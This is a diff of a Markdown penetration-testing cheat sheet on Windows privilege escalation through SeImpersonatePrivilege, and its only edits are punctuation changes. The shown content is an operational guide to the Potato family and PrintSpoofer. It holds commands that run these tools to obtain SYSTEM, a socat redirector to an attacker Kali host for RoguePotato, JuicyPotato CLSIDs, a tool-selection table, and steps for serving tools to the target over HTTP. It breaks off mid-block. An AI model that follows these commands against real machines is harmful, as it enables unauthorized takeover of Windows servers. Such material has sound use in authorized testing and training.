@@ -2,24 +2,24 @@
 
 These tools abuse **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** to escalate from a service account to SYSTEM.
 
-Very common on Windows targets — IIS, MSSQL, Jenkins, and most Windows services run with these privileges by default.
+Very common on Windows targets - IIS, MSSQL, Jenkins, and most Windows services run with these privileges by default.
 
 ---
 
 ## Why This Privilege Exists (And Why It's Exploitable)
 
-Windows has a concept called **token impersonation** — the ability for a process to temporarily act as a different user. This is intentional and needed for legitimate Windows functionality. For example:
+Windows has a concept called **token impersonation** - the ability for a process to temporarily act as a different user. This is intentional and needed for legitimate Windows functionality. For example:
 
 - An IIS web server handles requests from many different users. When user A makes a request, IIS needs to temporarily "become" user A to access files that user A is allowed to see. That requires `SeImpersonatePrivilege`.
 - A SQL Server service needs to impersonate the connecting user to enforce database permissions.
 
-So Windows grants this privilege to service accounts by design. The problem is it lets you impersonate **any** user that authenticates to your process — including SYSTEM.
+So Windows grants this privilege to service accounts by design. The problem is it lets you impersonate **any** user that authenticates to your process - including SYSTEM.
 
 **How the attack works:**
 1. You trigger a privileged Windows component (Print Spooler, COM server, etc.) to authenticate back to a server you control
 2. That component authenticates as SYSTEM
 3. Your tool captures that SYSTEM token
-4. You impersonate it → you are now SYSTEM
+4. You impersonate it -> you are now SYSTEM
 
 The different Potato/PrintSpoofer tools use different Windows components to trigger step 1, which is why different tools work on different OS versions.
 
@@ -37,11 +37,11 @@ SeImpersonatePrivilege        Impersonate a client after authentication    Enabl
 SeAssignPrimaryTokenPrivilege Replace a process level token               Enabled
 ```
 
-If you see it → run one of the tools below immediately.
+If you see it -> run one of the tools below immediately.
 
 ---
 
-## GodPotato (Best — Works on Windows 2012–2022)
+## GodPotato (Best - Works on Windows 2012-2022)
 
 Most reliable across modern Windows versions. Use this first.
 
@@ -69,19 +69,19 @@ upload /path/to/GodPotato.exe
 
 # 3. Run it
 .\GodPotato.exe -cmd "cmd /c whoami"
-# Output: nt authority\system ← done
+# Output: nt authority\system <- done
 ```
 
 ---
 
-## PrintSpoofer (Windows 10 / Server 2016–2019)
+## PrintSpoofer (Windows 10 / Server 2016-2019)
 
 Abuses the Print Spooler service to get a SYSTEM token.
 
 ```sh
 # Download: https://github.com/itm4n/PrintSpoofer
 
-# SYSTEM shell (interactive — needs a real TTY, works in evil-winrm)
+# SYSTEM shell (interactive - needs a real TTY, works in evil-winrm)
 .\PrintSpoofer.exe -i -c cmd.exe
 
 # Run a command
@@ -100,7 +100,7 @@ Abuses the Print Spooler service to get a SYSTEM token.
 Requires a redirector on Kali (port 135):
 
 ```sh
-# On Kali — redirect port 135 to your machine
+# On Kali - redirect port 135 to your machine
 socat tcp-listen:135,reuseaddr,fork tcp:<KALI-IP>:9999 &
 
 # On target
@@ -109,7 +109,7 @@ socat tcp-listen:135,reuseaddr,fork tcp:<KALI-IP>:9999 &
 
 ---
 
-## JuicyPotato (Older — Windows 7/Server 2008–2016)
+## JuicyPotato (Older - Windows 7/Server 2008-2016)
 
 Needs a valid CLSID for the target OS. Use when on older systems.
 
@@ -123,7 +123,7 @@ Needs a valid CLSID for the target OS. Use when on older systems.
 # Win 10:      {F3DAF5D9-7537-4B1E-BCE2-FAE6B6D3E14D}
 ```
 
-> JuicyPotato doesn't work on Server 2019+ — use GodPotato or PrintSpoofer instead.
+> JuicyPotato doesn't work on Server 2019+ - use GodPotato or PrintSpoofer instead.
 
 ---
 
@@ -145,14 +145,14 @@ Combines multiple potato techniques, tries them in order.
 | Server 2016 | GodPotato | PrintSpoofer, then RoguePotato |
 | Server 2012 / 2012 R2 | JuicyPotato | GodPotato |
 | Windows 7 / Server 2008 / 2008 R2 | JuicyPotato | Rotten Potato (legacy) |
-| Unknown — start here | GodPotato | SweetPotato (chains multiple techniques) |
+| Unknown - start here | GodPotato | SweetPotato (chains multiple techniques) |
 
 ---
 
 ## Getting the Tools onto Target
 
 ```sh
-# On Kali — serve tools
+# On Kali - serve tools
 python3 -m http.server 8080
 
 # In your shell on target (PowerShell)
